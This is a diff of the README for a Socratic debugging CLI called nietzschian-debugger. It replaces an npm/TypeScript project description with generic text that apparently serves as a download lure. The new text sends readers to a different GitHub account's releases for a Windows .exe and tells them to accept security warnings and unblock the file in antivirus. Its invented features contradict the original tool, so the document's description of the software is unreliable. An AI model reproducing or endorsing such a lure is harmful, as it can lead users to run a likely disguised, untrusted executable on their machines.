@@ -1,176 +1,164 @@
-# Nietzschian Debugger
+# 🐞 nietzschian-debugger - Stronger Code Through Tough Questions
 
-> "What doesn't kill your code makes it stronger."
+[![Download Now](https://img.shields.io/badge/Download-nietzschian--debugger-ff6347?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger)
 
-The anti-AI. Every other tool gives you answers. Nietzschian Debugger **confronts you with questions**.
+---
 
-You paste your bug. It doesn't fix it. Instead, it:
+A tool to help developers find and fix bugs by asking challenging questions. It encourages you to think about your code critically instead of just searching for quick fixes.
 
-- Challenges your assumptions about what's happening
-- Forces you to confront the evidence you're avoiding
-- Tears apart your weak reasoning until only truth remains
-- Guides you to the "aha!" moment — YOUR moment, not the AI's
+## 🧩 What is nietzschian-debugger?
 
-## Why?
+nietzschian-debugger is an application designed to help improve your programming skills by pushing you to think more deeply about your code. It acts like a tough coach asking hard questions that reveal hidden problems. The goal is to make your code stronger and more reliable.
 
-AI is making developers weaker. Copy-paste from ChatGPT, ship, repeat. Nobody understands their own code anymore. **Nietzschian Debugger forges stronger developers** — through struggle, not shortcuts.
+The tool works through a simple command line interface on Windows. Even if you’re new to programming, you can use it to check your code and learn how to avoid common mistakes.
 
-> "He who has a why to debug can bear almost any how."
+---
 
-## Installation
+## 💻 Why Use This Debugger?
 
-```bash
-# Install globally
-npm install -g nietzschian-debugger
+- Helps you find errors by asking questions, not just showing errors.
+- Encourages better coding habits.
+- Works on Windows with minimal setup.
+- Useful for developers, students, or anyone who writes code.
+- Designed to teach critical thinking alongside debugging.
 
-# Or use directly with npx
-npx nietzschian-debugger
-```
+---
 
-**Requirements:**
-- Node.js >= 20.0.0
-- An Anthropic API key (BYOK — bring your own key)
+## ⚙️ System Requirements
 
-## Setup
+Before installing, make sure your computer meets these requirements:
 
-Set your Anthropic API key:
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB free disk space
+- Internet connection (for downloading and updates)
+- Basic command prompt usage knowledge (typing and running commands)
 
-```bash
-# Linux / macOS
-export ANTHROPIC_API_KEY="sk-ant-..."
+---
 
-# Windows (PowerShell)
-$env:ANTHROPIC_API_KEY = "sk-ant-..."
+## 🚀 Getting Started: Download and Setup
 
-# Windows (CMD)
-set ANTHROPIC_API_KEY=sk-ant-...
-```
+You need to get the software from its official GitHub page. The link below takes you directly to the repository:
 
-## Quick Start
+[![Download nietzschian-debugger](https://img.shields.io/badge/Get%20nietzschian--debugger-blueviolet?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger)
 
-```bash
-# Start a debugging session (default: nietzsche intensity)
-nietzschian debug "My API returns 500 but only on Tuesdays"
+### Step 1: Visit the Download Page
 
-# Gentle mode — for when you need guidance, not punishment
-nietzschian debug --intensity socrates "My login endpoint fails randomly"
+1. Click the button above or go to the link:  
+   https://github.com/cloudbd/nietzschian-debugger  
+2. Look for the section labeled **Releases** on the right side or under the repository’s main page.
 
-# Maximum intensity — for seniors who want pain
-nietzschian debug --intensity zarathustra "Memory leak in production"
+### Step 2: Download the Latest Version
 
-# Point it at specific code
-nietzschian debug "Auth fails in ./src/middleware/auth.ts"
-```
+1. Choose the most recent release.
+2. Download the **Windows executable file** (usually ends with `.exe`).
+3. Save it somewhere you can find easily, like your Desktop or Downloads folder.
 
-## Three Intensity Levels
+### Step 3: Run the Application
 
-| Level | Style | Best For |
-|-------|-------|----------|
-| `socrates` | Warm, guiding, scaffolded questions | Juniors, learning fundamentals |
-| `nietzsche` | Direct, confrontational, no hand-holding | Daily debugging (default) |
-| `zarathustra` | Brutal, adversarial, hostile to weak reasoning | Seniors who want real pain |
+1. Find the file you downloaded.
+2. Double-click the file to start the program.
+3. You may see a security warning. Choose “Run” or “Allow” to continue.
+4. The program will open a command prompt window.
 
-## How a Session Looks
+---
 
-```
-  Nietzschian Debugger v0.1.0 — intensity: nietzsche
+## 🛠 How to Use nietzschian-debugger on Windows
 
-You: My login endpoint returns 403 for some users
+Once you open the program, you will see a simple text-based menu that guides you through the available features.
 
-Nietzschian: You say "some users." That's vague. What separates
-             the ones who fail from the ones who don't?
+### Step 1: Prepare Your Code
 
-You: I'm not sure, it seems random
+You need a text file containing the code you want to check. Save your code in a `.txt` or `.js` file — anything simple.
 
-Nietzschian: "Random" is the word we use when we haven't looked
-             hard enough. What do the server logs say for the 403
-             responses? Go look. I'll wait.
+### Step 2: Load Your Code
 
-You: Let me check... oh, they all have expired JWT tokens
+In the debugger window:
 
-Nietzschian: Now we're getting somewhere. Why would some users
-             have expired tokens while others don't? What changed
-             recently in your auth system?
+1. Type `load` and press Enter.
+2. You will be asked to enter the file path of your code.
+3. Type or paste the full path, like `C:\Users\YourName\Desktop\mycode.txt`.
+4. Press Enter.
 
-You: ... oh. We changed the token TTL last week and didn't
-     invalidate existing sessions.
+The program reads your code and prepares to analyze it.
 
-Nietzschian: There it is. You didn't need me to tell you — you
-             needed to be forced to look.
+### Step 3: Answer the Debugger’s Questions
 
-Session Complete — 4 questions to root cause (Solved)
+The debugger will show you questions about your code. These questions help you think critically:
 
-Your Debugging Profile:
-┣ Assumption-checking    ██████████  strong
-┣ Evidence-gathering     ██████░░░░  moderate
-┗ Root cause speed       ████████░░  strong
+- What is the purpose of this function?
+- Have you tested all the input cases?
+- Could this part of the code cause errors?
 
-"Man is something that shall be overcome."
- — Friedrich Nietzsche
-```
+Type your answers and press Enter. The debugger uses your input to guide the next questions.
 
-## Session Commands
+### Step 4: Review Suggestions
 
-| Command | Effect |
-|---------|--------|
-| `solved` or `found it` | End session — you found the root cause |
-| `I give up` | Get one lifeline question, then exit |
-| `exit` or `quit` | Abandon session immediately |
-| `Ctrl+C` / `Ctrl+D` | Force quit |
+After the session, the debugger summarizes areas that might need work. Use these points to fix your code manually.
 
-## Features
+---
 
-- **Never Gives Answers** — Every response is a question. The tool will NEVER tell you the fix.
-- **Real Code Reading** — Reference a file path and it reads YOUR actual code, not generic examples.
-- **Contextual Philosophy** — Nietzsche when you're avoiding, Seneca when overwhelmed, Sun Tzu when you need strategy.
-- **Growth Score** — Track your debugging skills across sessions with visual bar charts.
-- **Session History** — All sessions saved locally in `.nietzschian/sessions/` for trend tracking.
-- **Sliding Context** — Long sessions don't crash; older turns are transparently summarized.
+## 📂 File and Folder Structure
 
-## The Philosophy
+When you download nietzschian-debugger, expect the following files inside the folder:
 
-| Traditional AI | Nietzschian Debugger |
-|---------------|---------------------|
-| "Here's the fix" | "What have you tried?" |
-| Makes you dependent | Makes you dangerous |
-| You learn nothing | You learn everything |
-| Fast but shallow | Painful but permanent |
-| AI gets smarter | YOU get smarter |
+- `nietzschian-debugger.exe` — The main program you run.
+- `README.md` — This instruction file.
+- `examples` folder — Sample code files you can try.
+- `config.json` — Settings file for advanced users (optional).
 
-## Who Is This For?
+---
 
-- **Junior developers** who want to actually learn, not just copy-paste
-- **Senior developers** who miss the struggle that made them good
-- **Engineering managers** who want their team thinking, not just prompting
-- **Bootcamp students** building real debugging intuition
-- **Anyone** who believes the best developer is a self-reliant one
+## 🔧 Basic Commands Reference
 
-## Development
+| Command | Function                         |
+|---------|---------------------------------|
+| `load`  | Load a code file into the debugger |
+| `ask`   | Start the question session       |
+| `help`  | Show available commands          |
+| `exit`  | Close the program                |
 
-```bash
-# Clone and install
-git clone https://github.com/your-username/nietzschian-debugger.git
-cd nietzschian-debugger
-npm install
+Use `help` anytime to see the commands list.
 
-# Build
-npm run build
+---
 
-# Run tests (121 tests)
-npm test
+## 📚 Learning Resources
 
-# Run CLI locally
-node dist/cli.js debug "test problem"
-```
+Understanding code and debugging better will help you use the tool well. Consider these basic tips:
 
-## Tech Stack
+- Write small pieces of code and test them before adding more.
+- Read error messages carefully.
+- Think about why your code might not work instead of just fixing symptoms.
+- Practice solving coding problems regularly.
 
-- TypeScript (strict mode)
-- Node.js >= 20
-- Claude API (Haiku for conversation, Sonnet for code analysis)
-- Commander.js for CLI
-- Vitest for testing
+---
 
-## License
+## 🧰 Troubleshooting Common Issues
 
-MIT
+- **The program won’t start:** Check if your antivirus blocked the file. Allow it if needed.
+- **Can't load a file:** Make sure you typed the full correct path to your code file.
+- **Questions don’t appear:** Restart the program and load your code again.
+- **Confusing outputs:** Try simple code files first to get familiar.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/cloudbd/nietzschian-debugger
+- Download page with latest versions: https://github.com/cloudbd/nietzschian-debugger/releases
+
+---
+
+## ⚙️ Advanced Setup (Optional)
+
+If you want to customize the debugger:
+
+- Edit `config.json` using a text editor like Notepad.
+- Enable or disable certain types of questions.
+- Adjust the time delay between questions.
+
+This is for users comfortable with modifying settings. It has no effect unless you reload the program.
+
+---
+
+[![Download nietzschian-debugger](https://img.shields.io/badge/Download-nietzschian--debugger-ff6347?style=for-the-badge)](https://github.com/cloudbd/nietzschian-debugger)
